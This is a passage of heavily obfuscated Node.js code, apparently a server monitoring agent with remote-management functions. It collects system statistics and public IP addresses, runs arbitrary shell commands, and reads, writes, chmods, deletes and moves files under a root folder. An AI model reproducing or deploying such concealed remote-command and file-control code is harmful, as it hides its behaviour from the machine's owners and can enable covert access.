                'ECMRH': function (d, f, g) {
                    return d(f, g);
                },
                'JFPmo': bw(0x548),
                'Wptig': '/sys/fs/cgroup/memory/memory.usage_in_bytes',
                'vCkKe': function (d, f) {
                    return d(f);
                },
                'YWKJP': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[bw(0x523)](a[bw(0x73e)], a[bw(0x2f8)]))[bw(0x61c)]();
            b = a[bw(0x549)](d, a[bw(0x5fa)]) ? null : a[bw(0x4bf)](parseInt, d, 0xa), c = a[bw(0x636)](parseInt, (await a0m['readFile'](a['nLwnn'], bw(0x58c)))['trim'](), 0xa);
        } catch {
            try {
                b = a['ECMRH'](parseInt, (await a0m[bw(0x523)](a[bw(0x150)], bw(0x58c)))[bw(0x61c)](), 0xa), c = a[bw(0x4bf)](parseInt, (await a0m[bw(0x523)](a['Wptig'], a[bw(0x2f8)]))[bw(0x61c)](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0t[bw(0x32e)]();
                b = f[bw(0x48b)], c = f[bw(0x35c)];
            }
        }
        if (b === null) {
            const g = await a0t['mem']();
            b = g[bw(0x48b)], (a[bw(0x549)](c, null) || a[bw(0x29d)](isNaN, c)) && (c = g[bw(0x35c)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[bw(0x674)](b, c),
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const bx = a0aO, [a, b, c, d] = await Promise[bx(0x756)]([
                a0t[bx(0x412)](),
                this[bx(0x595)](),
                a0t[bx(0x22f)](),
                a0t[bx(0x410)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[bx(0x756)]([
                this[bx(0x4b8)](),
                this['getPublicIpV6']()
            ]);
        } catch (h) {
            a0B[bx(0x637)]('获取\x20IP\x20地址失败:\x20' + h['message'], 0x1);
        }
        return {
            'arch': a0o[bx(0x2d1)](),
            'cpu_cores': a[bx(0x1a6)],
            'cpu_name': a[bx(0x4a6)],
            'disk_total': (await a0t[bx(0x300)]())[0x0]?.['size'] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bx(0x48b)],
            'os': c[bx(0x297)] + '\x20' + c[bx(0x230)],
            'kernel_version': c[bx(0x79c)],
            'swap_total': b[bx(0x798)],
            'version': a0N[bx(0x739)],
            'virtualization': await this[bx(0x1b1)](),
            'session_key': a0N['SESSION_KEY'],
            'noise_key': a0N['NOISE_KEY']
        };
    }
    [a0aO(0x27b)]() {
        const by = a0aO, a = {
                'FNnMN': function (c, d) {
                    return c === d;
                },
                'fhwYm': by(0x40f)
            }, b = a0o[by(0x410)]();
        for (const c of Object[by(0x3c7)](b)) {
            for (const d of b[c]) {
                const f = a[by(0x757)](d['family'], a[by(0x76b)]) || d[by(0x280)] === 0x4;
                if (f && !d[by(0x4ce)]) {
                    if (!/^10\./[by(0x1ec)](d[by(0x20b)]) && !/^192\.168\./[by(0x1ec)](d[by(0x20b)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[by(0x1ec)](d['address']))
                        return d[by(0x20b)];
                }
            }
        }
        return null;
    }
    async [a0aO(0x4b8)]() {
        const bz = a0aO, a = {
                'pUqhQ': 'https://api.ipify.org',
                'WVUft': bz(0x6f4),
                'rjHzS': bz(0x316),
                'xugyr': bz(0x72c),
                'wdTUW': bz(0x77e)
            }, b = [
                a[bz(0x76c)],
                a[bz(0x486)],
                bz(0x31b),
                a[bz(0x717)],
                bz(0x6fe),
                a[bz(0x6c5)],
                a[bz(0x16d)]
            ];
        for (const d of b) {
            try {
                const f = await this[bz(0x630)](d, 0x4);
                if (f && this[bz(0x4c1)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[bz(0x27b)]();
        if (c && this[bz(0x4c1)](c))
            return c;
        return null;
    }
    [a0aO(0x4c0)]() {
        const bA = a0aO, a = {
                'hsTCM': function (c, d) {
                    return c === d;
                },
                'xXbkN': bA(0x588),
                'IlJLb': function (c, d) {
                    return c === d;
                },
                'ccDWP': bA(0x3f5)
            }, b = a0o[bA(0x410)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a['hsTCM'](d[bA(0x280)], a[bA(0x20d)]) || a['IlJLb'](d[bA(0x280)], 0x6);
                if (f && !d['internal']) {
                    if (!d[bA(0x20b)][bA(0x441)]()[bA(0x2c3)](a[bA(0x635)]))
                        return d[bA(0x20b)];
                }
            }
        }
        return null;
    }
    async [a0aO(0x75f)]() {
        const bB = a0aO, a = {
                'XbHpT': 'https://icanhazip.com',
                'pBXYB': bB(0x796)
            }, b = this[bB(0x4c0)]();
        if (b && this['isValidIPv6'](b))
            return b;
        const c = [
            bB(0x175),
            a[bB(0x2c8)],
            a['pBXYB']
        ];
        for (const d of c) {
            try {
                const f = await this[bB(0x630)](d, 0x6);
                if (f && this[bB(0x4d2)](f))
                    return f;
            } catch (g) {
                a0B[bB(0x637)]('访问\x20' + d + bB(0x494) + g['message']);
                continue;
            }
        }
        return null;
    }
    async [a0aO(0x630)](a, b = 0x0) {
        const bC = a0aO, c = {
                'RZSpP': function (d, f) {
                    return d(f);
                },
                'IhSaW': bC(0x146),
                'qbHCa': function (d, f) {
                    return d(f);
                },
                'iiAcD': function (d, f) {
                    return d(f);
                },
                'baIRZ': bC(0x2c7),
                'kDZbK': 'error'
            };
        return new Promise((d, f) => {
            const bE = bC, g = {
                    'wnKEv': function (k, l) {
                        const bD = a0b;
                        return c[bD(0x40e)](k, l);
                    },
                    'iEeez': c['IhSaW'],
                    'Xyhrt': bE(0x755),
                    'pOthQ': function (k, l) {
                        const bF = bE;
                        return c[bF(0x5b4)](k, l);
                    },
                    'PHdky': bE(0x47d)
                }, h = c[bE(0x5c5)](require, c['baIRZ']), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': bE(0x657) }
                }, j = h[bE(0x6f7)](a, i, k => {
                    const bG = bE;
                    let l = '';
                    if (k[bG(0x49b)] !== 0xc8) {
                        g[bG(0x26b)](f, new Error(bG(0x685) + k[bG(0x49b)]));
                        return;
                    }
                    k['on'](g[bG(0x1dc)], m => l += m), k['on'](g['Xyhrt'], () => d(l['trim']()));
                });
            j['on'](c['kDZbK'], f), j[bE(0x179)](0x1388, () => {
                const bH = bE;
                j[bH(0x482)](), g[bH(0x6b9)](f, new Error(g[bH(0x4b7)]));
            });
        });
    }
    [a0aO(0x4c1)](a) {
        return /^(\d{1,3}\.){3}\d{1,3}$/['test'](a);
    }
    [a0aO(0x4d2)](a) {
        const bI = a0aO;
        if (!/^[0-9a-fA-F:]+$/[bI(0x1ec)](a) || !a[bI(0x47a)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bI(0x1ec)](a))
            return ![];
        return !![];
    }
    async [a0aO(0x6ed)]() {
        const bJ = a0aO, a = {
                'ZMuJn': function (m, n) {
                    return m / n;
                },
                'gJBYs': function (m, n) {
                    return m - n;
                },
                'UEwqg': function (m, n) {
                    return m * n;
                },
                'ExQKL': function (m, n) {
                    return m / n;
                },
                'zYfHu': function (m, n) {
                    return m * n;
                }
            }, [b, c, d, f] = await Promise[bJ(0x756)]([
                a0t[bJ(0x427)](),
                a0t['mem'](),
                a0t['networkStats'](),
                a0t[bJ(0x427)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a['ZMuJn'](Date[bJ(0x1e4)](), 0x3e8), i = a[bJ(0x669)](h, this[bJ(0x4f8)]), j = g[bJ(0x3b2)] - this['lastNetworkStats']['tx'], k = g[bJ(0x3fd)] - this['lastNetworkStats']['rx'];
        this['totalNetworkUp'] += j, this[bJ(0x61a)] += k, this[bJ(0x378)] = {
            'tx': g[bJ(0x3b2)],
            'rx': g[bJ(0x3fd)]
        }, this[bJ(0x4f8)] = h;
        const l = await a0t[bJ(0x617)]();
        return {
            'cpu': { 'usage': Math[bJ(0x28d)](b[bJ(0x427)]) },
            'ram': {
                'total': c[bJ(0x48b)],
                'used': c[bJ(0x552)]
            },
            'swap': {
                'total': c[bJ(0x798)],
                'used': c[bJ(0x78c)]
            },
            'load': {
                'load1': Math[bJ(0x28d)](a['UEwqg'](f[bJ(0x524)], 0x64)) / 0x64,
                'load5': a['ExQKL'](Math[bJ(0x28d)](a[bJ(0x1c1)](f[bJ(0x524)], 0x64)), 0x64),
                'load15': a['ExQKL'](Math[bJ(0x28d)](a[bJ(0x27d)](f['avgLoad'], 0x64)), 0x64)
            },
            'disk': await this[bJ(0x200)](),
            'network': {
                'up': Math[bJ(0x28d)](j / i),
                'down': Math['round'](a[bJ(0x5e7)](k, i)),
                'totalUp': this[bJ(0x51f)],
                'totalDown': this[bJ(0x61a)]
            },
            'connections': await this['_getConnections'](),
            'uptime': a0o[bJ(0x6d9)](),
            'process': l?.[bJ(0x756)] || 0x0,
            'message': ''
        };
    }
    async [a0aO(0x1b1)]() {
        const bK = a0aO, a = {
                'fVIEq': 'Docker',
                'enLNc': bK(0x25a),
                'UaUwG': bK(0x1a2),
                'KXGpF': bK(0x58c),
                'zjbOt': bK(0x4b6),
                'GjCpL': bK(0x1db),
                'gsftT': bK(0x73a),
                'FdCGT': bK(0x330),
                'njsFz': bK(0x214),
                'dgVgE': bK(0x2f3),
                'mAIXW': bK(0x3e3),
                'ldBBY': bK(0x250),
                'YxvyA': bK(0x522),
                'KKHnh': bK(0x1c8),
                'mvzsw': bK(0x41f),
                'rcdSV': bK(0x6be),
                'IIPxL': '/proc/cpuinfo',
                'XczQu': bK(0x5df),
                'iiLrI': bK(0x347),
                'kjepL': bK(0x4d6)
            };
        try {
            if (a0l[bK(0x45d)](bK(0x555)))
                return a['fVIEq'];
            if (a0l['existsSync'](a[bK(0x6ec)]))
                return bK(0x589);
            if (a0l[bK(0x45d)](a[bK(0x2f2)])) {
                const b = a0l['readFileSync']('/proc/1/cgroup', a[bK(0x4dd)])[bK(0x441)]();
                if (b[bK(0x47a)](a['zjbOt']) || b[bK(0x47a)](a['GjCpL']))
                    return a[bK(0x3b1)];
                else {
                    if (b['includes'](a[bK(0x21a)]))
                        return a[bK(0x59b)];
                    else {
                        if (b[bK(0x47a)](a[bK(0x471)]))
                            return bK(0x6be);
                    }
                }
            }
            if (a0l[bK(0x45d)](bK(0x2f3))) {
                const c = a0l[bK(0x73d)](a[bK(0x74a)], bK(0x58c));
                if (c[bK(0x47a)](a[bK(0x75e)]) || c[bK(0x47a)](a[bK(0x45a)]))
                    return a[bK(0x3b1)];
                else {
                    if (c[bK(0x47a)](bK(0x351)) || c[bK(0x47a)](a[bK(0x507)]))
                        return bK(0x330);
                }
            }
            if (a0l[bK(0x45d)](bK(0x1c8))) {
                const d = a0l[bK(0x73d)](a[bK(0x4b1)], a['KXGpF']);
                if (d[bK(0x47a)](a[bK(0x3bf)]))
                    return a[bK(0x23b)];
            }
            if (a0l[bK(0x45d)](a[bK(0x2ed)])) {
                const f = a0l[bK(0x73d)](a[bK(0x2ed)], 'utf8');
                if (f[bK(0x47a)](a[bK(0x1e1)]) || f[bK(0x47a)](a[bK(0x5c6)]))
                    return bK(0x5df);
            }
        } catch (g) {
        }
        return a[bK(0x58e)];
    }
    async [a0aO(0x200)]() {
        const bL = a0aO, a = {
                'SBLGb': function (b, c) {
                    return b > c;
                },
                'rrhHV': function (b, c) {
                    return b !== c;
                },
                'DpEYA': bL(0x71f),
                'pGOgC': bL(0x598)
            };
        try {
            const b = await a0t['fsSize'](), c = b[bL(0x653)](g => {
                    const bM = bL;
                    return a[bM(0x1c0)](g[bM(0x2ea)], 0x0) && g[bM(0x1a9)] !== bM(0x5ac) && a[bM(0x4a1)](g['type'], a['DpEYA']) && g['fs'][bM(0x2c3)](a[bM(0x565)]);
                }), d = c[bL(0x24b)]((g, h) => g + h[bL(0x2ea)], 0x0), f = c[bL(0x24b)]((g, h) => g + h[bL(0x35c)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async ['_getConnections']() {
        const bN = a0aO;
        try {
            const a = await a0t[bN(0x2f9)](), b = a[bN(0x653)](d => d[bN(0x21b)] === bN(0x14e))[bN(0x261)], c = a[bN(0x653)](d => d[bN(0x21b)] === 'udp')['length'];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0T {
    static async ['execute'](a, b = {}) {
        const bO = a0aO, c = {
                'QoikC': function (d, f) {
                    return d || f;
                },
                'NIPbF': bO(0x61e),
                'JPIMb': function (d, f) {
                    return d(f);
                },
                'qOkHf': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'zKsfh': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[bO(0x41e)](),
                env: env = {},
                timeout: timeout = a0N['Rtimeout']
            } = b;
        return new Promise(d => {
            const bQ = bO, f = {
                    'JisXC': function (i, j) {
                        return i - j;
                    },
                    'ievri': function (i, j) {
                        const bP = a0b;
                        return c[bP(0x5d9)](i, j);
                    },
                    'wImyQ': c[bQ(0x496)],
                    'vdGEY': function (i, j) {
                        const bR = bQ;
                        return c[bR(0x517)](i, j);
                    }
                }, g = Date[bQ(0x1e4)](), h = c['qOkHf'](a0q, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['zKsfh'](timeout, 0x3e8),
                    'maxBuffer': c[bQ(0x38c)](0xa * 0x400, 0x400)
                }, (i, j, k) => {
                    const bS = bQ, l = f[bS(0x60f)](Date[bS(0x1e4)](), g), m = i && i[bS(0x77f)] && i[bS(0x1e8)];
                    let n = f[bS(0x4d9)](j, '');
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            typeof i['code'] === f[bS(0x5c4)] ? o = i['code'] : o = -0x1;
                    }
                    f[bS(0x60a)](d, {
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
function a0U(a) {
    const bT = a0aO, b = {
            'HezBg': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l['realpathSync'][bT(0x5c1)](a0n['resolve'](a0N[bT(0x212)])), d = a0n['resolve'](a);
        let f = d;
        while (!a0l[bT(0x45d)](f)) {
            const j = a0n[bT(0x3ab)](f);
            if (b['HezBg'](j, f))
                return ![];
            f = j;
        }
        const g = a0l[bT(0x440)][bT(0x5c1)](f), h = a0n['relative'](c, g);
        if (h[bT(0x2c3)]('..') || a0n['isAbsolute'](h))
            return ![];
        const i = a0n[bT(0x6ee)](f, d);
        if (i && (i[bT(0x2c3)]('..') || a0n['isAbsolute'](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0V {
    static async [a0aO(0x428)](a, b = ![]) {
        const bU = a0aO, c = {
                'NBXlT': bU(0x19a),
                'bmQWO': 'file',
                'OPwkg': function (h, i) {
                    return h & i;
                },
                'VSNgo': function (h, i) {
                    return h(i);
                },
                'zxNVe': function (h, i) {
                    return h || i;
                },
                'lLHGA': bU(0x3dd)
            }, d = a0n[bU(0x3be)](a0N[bU(0x212)], c[bU(0x15d)](a, '.'));
        if (!c[bU(0x73c)](a0U, d))
            throw new Error(bU(0x3af));
        if (!a0l[bU(0x45d)](d))
            throw new Error(c[bU(0x70c)]);
        const f = [], g = h => {
                const bV = bU, i = a0l['readdirSync'](h);
                for (const j of i) {
                    const k = a0n[bV(0x4d0)](h, j), l = a0l[bV(0x59e)](k), m = new a0J();
                    m[bV(0x1bd)] = j, m['path'] = a0n[bV(0x6ee)](a0N[bV(0x212)], k), m['type'] = l[bV(0x1ae)]() ? c[bV(0x210)] : c[bV(0x26c)], m[bV(0x2ea)] = l[bV(0x2ea)], m['mtime'] = l[bV(0x14f)][bV(0x38f)](), m[bV(0x65e)] = this[bV(0x489)](l[bV(0x65e)], l['isDirectory']()), m[bV(0x201)] = '0o' + c[bV(0x7a7)](l[bV(0x65e)], 0x1ff)[bV(0x3e1)](0x8), m[bV(0x67e)] = l[bV(0x49f)] + ':' + l['gid'], f[bV(0x51c)](m), b && l[bV(0x1ae)]() && c[bV(0x73c)](g, k);
                }
            };
        return c[bU(0x73c)](g, d), f;
    }
    static async [a0aO(0x707)](a) {
        const bW = a0aO, b = {
                'Vinnm': bW(0x19a),
                'pcfuy': bW(0x62b)
            }, c = [];
        for (const d of a) {
            const f = a0n[bW(0x3be)](a0N['FILE_ROOT'], d);
            if (!a0U(f))
                continue;
            try {
                const g = a0l[bW(0x59e)](f), h = this[bW(0x64c)](f, a0l[bW(0x52a)][bW(0x5b6)]), i = this[bW(0x64c)](f, a0l[bW(0x52a)]['W_OK']), j = this[bW(0x64c)](f, a0l[bW(0x52a)][bW(0x65f)]), k = new a0K();
                k[bW(0x738)] = a0n[bW(0x6ee)](a0N[bW(0x212)], f), k['name'] = a0n[bW(0x488)](f), k[bW(0x65e)] = this['_formatMode'](g[bW(0x65e)], g[bW(0x1ae)]()), k[bW(0x201)] = '0o' + (g[bW(0x65e)] & 0x1ff)[bW(0x3e1)](0x8), k[bW(0x1a9)] = g[bW(0x1ae)]() ? b[bW(0x3aa)] : b[bW(0x724)], k[bW(0x776)] = h, k[bW(0x3fc)] = i, k['executable'] = j, c[bW(0x51c)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aO(0x64c)](a, b) {
        const bX = a0aO;
        try {
            return a0l[bX(0x498)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const bY = a0aO, b = {
                'jqFPQ': function (c, d) {
                    return c === d;
                },
                'xOZul': bY(0x61e),
                'pQRoM': function (c, d) {
                    return c === d;
                },
                'YXSsa': bY(0x69d),
                'suXDw': bY(0x778)
            };
        if (b[bY(0x66f)](typeof a, b['xOZul']))
            return a;
        if (b[bY(0x75a)](typeof a, b['YXSsa'])) {
            const c = a[bY(0x61c)]();
            if (/^[0-7]{3,4}$/['test'](c))
                return parseInt(c, 0x8);
        }
        throw new Error(b[bY(0x1f6)]);
    }
    static [a0aO(0x489)](a, b) {
        const bZ = a0aO, c = {
                'cwJRw': function (i, j) {
                    return i & j;
                },
                'byymR': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c[bZ(0x4b3)](a, 0x1ff)['toString'](0x8)['padStart'](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[bZ(0x4d1)](parseInt, i, 0xa);
            h += f[bZ(0x547)]((k, l) => j & 0x4 >> l ? k : '-')['join']('');
        }
        return h;
    }
    static async [a0aO(0x5d0)](a, b = ![]) {
        const c0 = a0aO, c = {
                'uAJIQ': function (g, h) {
                    return g(h);
                },
                'OULFI': function (g, h) {
                    return g(h);
                },
                'zgZml': c0(0x593),
                'Xhuot': function (g, h) {
                    return g(h);
                },
                'uertu': function (g, h) {
                    return g(h);
                }
            }, d = [];
        for (const [g, h] of Object[c0(0x248)](a)) {
            const i = a0n[c0(0x3be)](a0N['FILE_ROOT'], g);
            if (!a0U(i)) {
                d[c0(0x51c)]({
                    'path': g,
                    'requested': c['uAJIQ'](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[c0(0x49a)]
                });
                continue;
            }
            try {
                const j = this[c0(0x74b)](h), k = m => {
                        a0l['chmodSync'](m, j);
                    };
                if (b && a0l[c0(0x45d)](i) && a0l[c0(0x59e)](i)[c0(0x1ae)]()) {
                    const m = n => {
                        const c1 = c0;
                        c[c1(0x3d1)](k, n);
                        const o = a0l[c1(0x1e3)](n);
                        for (const p of o) {
                            const q = a0n['join'](n, p);
                            a0l['statSync'](q)[c1(0x1ae)]() ? c[c1(0x3d1)](m, q) : c[c1(0x671)](k, q);
                        }
                    };
                    c[c0(0x3d1)](m, i);
                } else
                    c[c0(0x3ae)](k, i);
                const l = j[c0(0x3e1)](0x8);
                d['push']({
                    'path': g,
                    'requested': c[c0(0x7ae)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[c0(0x51c)]({
                    'path': g,
                    'requested': c['uAJIQ'](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c0(0x49c),
                    'message': n['message']
                });
            }
        }
        const f = d[c0(0x653)](o => o[c0(0x7ac)] === 'ok')['length'];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0aO(0x523)](a) {
        const c2 = a0aO, b = {
                'MnOLB': function (h, i) {
                    return h(i);
                },
                'BPqbo': c2(0x3af),
                'kcmAC': function (h, i) {
                    return h > i;
                },
                'CsFAu': function (h, i) {
                    return h * i;
                },
                'zhSTm': 'File\x20too\x20large',
                'LRCLD': c2(0x3a2),
                'hWTtE': c2(0x62c)
            }, c = a0n[c2(0x3be)](a0N[c2(0x212)], a);
        if (!b['MnOLB'](a0U, c))
            throw new Error(b[c2(0x542)]);
        const d = a0l[c2(0x59e)](c);
        if (b[c2(0x6a2)](d[c2(0x2ea)], b[c2(0x5de)](0x400, 0x400)))
            throw new Error(b['zhSTm']);
        const f = a0l[c2(0x73d)](c), g = this[c2(0x4de)](f);
        return {
            'status': 'ok',
            'path': a0n[c2(0x6ee)](a0N[c2(0x212)], c),
            'content': g ? a0v['fromByteArray'](f) : f[c2(0x3e1)](c2(0x58c)),
            'encoding': g ? b['LRCLD'] : b['hWTtE'],
            'is_binary': g,
            'size': d[c2(0x2ea)]
        };
    }
    static [a0aO(0x4de)](a) {
        const c3 = a0aO, b = {
                'BNdZz': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b[c3(0x725)](a[c3(0x261)], 0x0))
            return ![];
        for (let c = 0x0; c < Math['min'](a[c3(0x261)], 0x200); c++) {
            if (b[c3(0x725)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0aO(0x64f)](a, b, c, d = null, f = null) {
        const c4 = a0aO, g = {
                'apwvt': c4(0x3af),
                'GVzFi': function (l, m) {
                    return l > m;
                },
                'xHauz': c4(0x510),
                'jMxbg': function (l, m) {
                    return l !== m;
                },
                'PnPmo': function (l, m) {
                    return l !== m;
                },
                'pmCRC': function (l, m) {
                    return l(m);
                },
                'niKmX': c4(0x153),
                'gAWDX': c4(0x28c),
                'zflNS': function (l, m) {
                    return l < m;
                }
            }, h = a0n[c4(0x3be)](a0N['FILE_ROOT'], a);
        let j = h;
        b && (j = a0n[c4(0x4d0)](h, b));
        if (!a0U(j))
            throw new Error(g[c4(0x694)]);
        !a0l[c4(0x45d)](a0n[c4(0x3ab)](j)) && a0l[c4(0x4aa)](a0n['dirname'](j), { 'recursive': !![] });
        const k = a0v[c4(0x506)](c);
        if (g['GVzFi'](k[c4(0x261)], a0N[c4(0x239)]))
            throw new Error(g[c4(0x7a5)]);
        if (g[c4(0x6da)](d, null) && g['PnPmo'](f, null)) {
            const l = g[c4(0x76e)](Number, d), m = g[c4(0x76e)](Number, f);
            if (Number[c4(0x53b)](l) || Number[c4(0x53b)](m))
                throw new Error(g[c4(0x695)]);
            const n = a0n['join'](a0n['dirname'](j), g[c4(0x350)], a0n['basename'](j));
            !a0l[c4(0x45d)](n) && a0l[c4(0x4aa)](n, { 'recursive': !![] });
            const o = a0n[c4(0x4d0)](n, 'chunk_' + l);
            a0l[c4(0x2f5)](o, k);
            const p = a0l[c4(0x1e3)](n)[c4(0x653)](s => s[c4(0x2c3)](c4(0x2ae))), q = p[c4(0x261)], r = q === m;
            if (r) {
                const s = a0l[c4(0x79b)](j);
                for (let u = 0x0; g['zflNS'](u, m); u++) {
                    const v = a0n[c4(0x4d0)](n, c4(0x2ae) + u);
                    if (!a0l['existsSync'](v)) {
                        s[c4(0x3f0)]();
                        throw new Error(c4(0x5c9) + u);
                    }
                    s[c4(0x34b)](a0l[c4(0x73d)](v));
                }
                s[c4(0x755)]();
                const t = a0n[c4(0x3ab)](n);
                a0l[c4(0x66e)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[c4(0x75c)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0n[c4(0x6ee)](a0N['FILE_ROOT'], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[c4(0x2f5)](j, k), {
            'status': 'ok',
            'path': a0n[c4(0x6ee)](a0N[c4(0x212)], j),
            'received': k['length'],
            'total': k['length'],
            'chunked': ![]
        };
    }
    static async [a0aO(0x682)](a, b, c, d = null, f = null) {
        const c5 = a0aO, g = {
                'MvlQc': function (k, l) {
                    return k || l;
                },
                'bSSvD': function (k, l) {
                    return k(l);
                },
                'WFwua': c5(0x3af),
                'iwdGq': c5(0x510),
                'khoMl': function (k, l) {
                    return k !== l;
                },
                'oXhmf': function (k, l) {
                    return k(l);
                },
                'ocfWp': c5(0x153),
                'YgaSX': c5(0x28c),
                'MIzZf': function (k, l) {
                    return k === l;
                },
                'WbXAW': c5(0x2df)
            }, h = a0n['resolve'](a0N[c5(0x212)], g[c5(0x483)](a, '.'));
        let j = h;
        b && (j = a0n[c5(0x4d0)](h, b));
        if (!g[c5(0x747)](a0U, j))
            throw new Error(g[c5(0x627)]);
        !a0l['existsSync'](a0n[c5(0x3ab)](j)) && a0l[c5(0x4aa)](a0n[c5(0x3ab)](j), { 'recursive': !![] });
        if (c[c5(0x261)] > a0N[c5(0x239)])
            throw new Error(g[c5(0x668)]);
        if (g[c5(0x1d5)](d, null) && g['khoMl'](f, null)) {
            const k = g[c5(0x747)](Number, d), l = g['oXhmf'](Number, f);
            if (Number[c5(0x53b)](k) || Number[c5(0x53b)](l))
                throw new Error(g[c5(0x779)]);
            const m = a0n[c5(0x4d0)](a0n[c5(0x3ab)](j), g[c5(0x1cb)], a0n[c5(0x488)](j));
            !a0l[c5(0x45d)](m) && a0l[c5(0x4aa)](m, { 'recursive': !![] });
            const n = a0n[c5(0x4d0)](m, c5(0x2ae) + k);
            a0l['writeFileSync'](n, c);
            const o = a0l[c5(0x1e3)](m)[c5(0x653)](r => r[c5(0x2c3)](c5(0x2ae))), p = o[c5(0x261)], q = g[c5(0x48a)](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; t < l; t++) {
                    const u = a0n[c5(0x4d0)](m, c5(0x2ae) + t);
                    if (!a0l[c5(0x45d)](u))
                        throw new Error(c5(0x5c9) + t);
                    r[c5(0x51c)](a0l[c5(0x73d)](u));
                }
                a0l[c5(0x2f5)](j, Buffer['concat'](r));
                const s = a0n[c5(0x3ab)](m);
                a0l[c5(0x66e)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0n[c5(0x6ee)](a0N[c5(0x212)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g['WbXAW']
                };
            }
            return {
                'status': 'ok',
                'path': a0n['relative'](a0N[c5(0x212)], j),
                'chunk_id': k,
                'completed': ![],
                'message': c5(0x583) + k + c5(0x379)
            };
        }
        return a0l[c5(0x2f5)](j, c), {
            'status': 'ok',
            'path': a0n[c5(0x6ee)](a0N[c5(0x212)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': c5(0x32a)
        };
    }
    static async [a0aO(0x167)](a) {
        const c6 = a0aO, b = {
                'QWiRl': function (h, i) {
                    return h(i);
                },
                'MgUBG': c6(0x188)
            }, c = a0n[c6(0x3be)](a0N[c6(0x212)], a);
        if (!b[c6(0x5db)](a0U, c))
            throw new Error(c6(0x3af));
        if (!a0l[c6(0x45d)](c))
            throw new Error(b[c6(0x737)]);
        const d = a0l[c6(0x59e)](c), f = a0l['readFileSync'](c), g = a0v[c6(0x3ef)](f);
        return {
            'path': a0n[c6(0x6ee)](a0N[c6(0x212)], c),
            'content': g,
            'size': d['size']
        };
    }
    static async [a0aO(0x571)](a) {
        const c7 = a0aO, b = {
                'jcFXE': function (d, f) {
                    return d(f);
                },
                'skKWG': c7(0x49c)
            }, c = [];
        for (const d of a) {
            const f = a0n[c7(0x3be)](a0N[c7(0x212)], d);
            if (!b[c7(0x699)](a0U, f)) {
                c[c7(0x51c)]({
                    'path': d,
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                if (a0l['existsSync'](f)) {
                    const g = a0l[c7(0x59e)](f);
                    g[c7(0x1ae)]() ? a0l['rmSync'](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c[c7(0x51c)]({
                        'path': d,
                        'status': c7(0x746)
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': c7(0x15e)
                    });
            } catch (h) {
                c['push']({
                    'path': d,
                    'status': b[c7(0x77d)],
                    'message': h[c7(0x6ac)]
                });
            }
        }
        return c;
    }
    static async [a0aO(0x4e4)](a) {
        const c8 = a0aO, b = {
                'grbod': function (d, f) {
                    return d(f);
                },
                'sSsEC': c8(0x593),
                'TddMI': c8(0x49c)
            }, c = [];
        for (const [d, f] of Object[c8(0x248)](a)) {
            const g = a0n['resolve'](a0N[c8(0x212)], d), h = a0n[c8(0x3be)](a0N['FILE_ROOT'], f);
            if (!b[c8(0x75b)](a0U, g) || !b[c8(0x75b)](a0U, h)) {
                c[c8(0x51c)]({
                    'from': d,
                    'to': f,
                    'status': b[c8(0x39c)]
                });
                continue;
            }
            try {
                const i = a0n[c8(0x3ab)](h);
                !a0l['existsSync'](i) && a0l[c8(0x4aa)](i, { 'recursive': !![] }), a0l['renameSync'](g, h), c[c8(0x51c)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[c8(0x51c)]({
                    'from': d,
                    'to': f,
